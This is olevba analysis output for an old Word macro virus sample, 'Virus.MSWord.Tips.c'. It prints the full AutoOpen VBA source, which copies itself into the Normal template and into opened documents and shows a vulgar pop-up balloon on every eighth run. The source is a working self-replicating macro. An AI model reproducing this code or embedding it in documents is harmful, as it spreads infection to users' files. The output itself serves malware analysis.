olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tips.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tips.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Tips.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 01/18/99 by billgates from cuddapah"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.AutoOpen"
'
' AutoOpen Macro
' Macro created 01/18/99 by CUDDAPAH BELLGATES FROM MACROSHOFT
'
Dim newstr, filenme, oldstr, normal_template As String
Dim o_docname, n_docname As String
Dim source_name, target_name, temp_var As String
Dim cond_name As String
Dim vrbl As Integer
Dim i As Integer
Dim j As Long
Dim cntnr As Object

Dim retval

Set cntnr = MacroContainer
'MsgBox cntnr.Name & "  Is the container of this running code", vbCritical
cond_name = cntnr.Name


On Error GoTo err1

newstr = Application.ActiveWindow.Caption
filenme = newstr
newstr = newstr & " " & " "
Application.Caption = "Microsoft Word"
oldstr = newstr
Application.ActiveWindow.Caption = newstr
'Application.StatusBar = "Remember Microsoft Word is a Product of ORACLE Corporation INC!!!."
o_docname = Application.ActiveDocument.path
o_docname = o_docname & "\" & Application.ActiveDocument.Name
 

' ********* getting the source file name **********

If cond_name = Application.NormalTemplate.Name Then
 'MsgBox "Condition One", vbCritical
 
 source_name = Application.NormalTemplate.path
 source_name = source_name & "\" & Application.NormalTemplate.Name

' ********* getting the target file name ***********

target_name = Application.ActiveDocument.path
target_name = target_name & "\" & Application.ActiveDocument.Name

Else

'MsgBox "Condition Two", vbCritical

source_name = Application.ActiveDocument.path
source_name = source_name & "\" & Application.ActiveDocument.Name
 
target_name = Application.NormalTemplate.path
target_name = target_name & "\" & Application.NormalTemplate.Name

End If


'MsgBox source_name & " " & target_name
'on counter set to four then message and counter = 0

temp_var = System.PrivateProfileString("C:\micros.Ini", "MacroSettings", _
    "LastFile")
vrbl = Val(temp_var)

If vrbl = "8" Then
vrbl = 0
System.PrivateProfileString("C:\Micros.Ini", "MacroSettings", _
    "LastFile") = Str(vrbl)
 Set BLN = Assistant.NewBalloon
 
 
With BLN
    .Heading = "Tips of the Day"
    .Labels(1).Text = "Don't Shit in the Public Places."
    .Labels(2).Text = "Don't throw Your Undergarments whereever u want"
    .Labels(3).Text = "Don't Spit on your self"
    .BalloonType = msoBalloon
    .Mode = msoModeModal
    .Icon = msoIconAlert
    .Button = msoButtonSetOK
    
     retval = .Show
End With
Application.ActiveWindow.Close
End If

vrbl = vrbl + 1
System.PrivateProfileString("C:\Micros.Ini", "MacroSettings", _
    "LastFile") = Str(vrbl)

'MsgBox System.PrivateProfileString("C:\VirSet.Ini", "MacroSettings", _
    "LastFile")

normal_template = Application.NormalTemplate.Name




On Error GoTo err0

Application.OrganizerCopy source_name, target_name, "AutoOpen", wdOrganizerObjectProjectItems
Application.OrganizerCopy source_name, target_name, "BILLGATES", wdOrganizerObjectProjectItems

If target_name = normal_template Then
Application.NormalTemplate.Save
End If

Application.ActiveDocument.Save










'MsgBox o_docname
'MsgBox Application.ActiveDocument.Name





err0:
'MsgBox Err.Description

Exit Sub


err1:


End Sub

-------------------------------------------------------------------------------
VBA MACRO BILLGATES.bas 
in file: Virus.MSWord.Tips.c - OLE stream: 'Macros/VBA/BILLGATES'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

